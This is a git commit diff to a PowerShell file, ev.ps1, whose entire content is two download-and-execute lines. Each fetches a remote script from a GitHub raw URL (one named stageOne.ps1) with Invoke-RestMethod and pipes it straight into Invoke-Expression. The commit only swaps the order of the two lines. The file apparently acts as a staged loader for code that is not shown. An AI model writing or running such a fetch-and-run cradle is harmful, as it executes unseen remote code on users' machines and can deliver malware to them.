a451501f9e2213eb95317b6841cd9f532f2d8e65
allisonmorat <allisonmorat@proton.me>
2025-09-18 16:37:51 +0000

    Add files via upload

--- ev.ps1
+++ ev.ps1
@@ -1,3 +1,3 @@
-Invoke-RestMethod -Uri "https://raw.githubusercontent.com/allisonmorat/three/main/stageOne.ps1" | Invoke-Expression
-
 Invoke-RestMethod -Uri "https://raw.githubusercontent.com/allisonmorat/three/main/eartmp.ps1" | Invoke-Expression
+
+Invoke-RestMethod -Uri "https://raw.githubusercontent.com/allisonmorat/three/main/stageOne.ps1" | Invoke-Expression
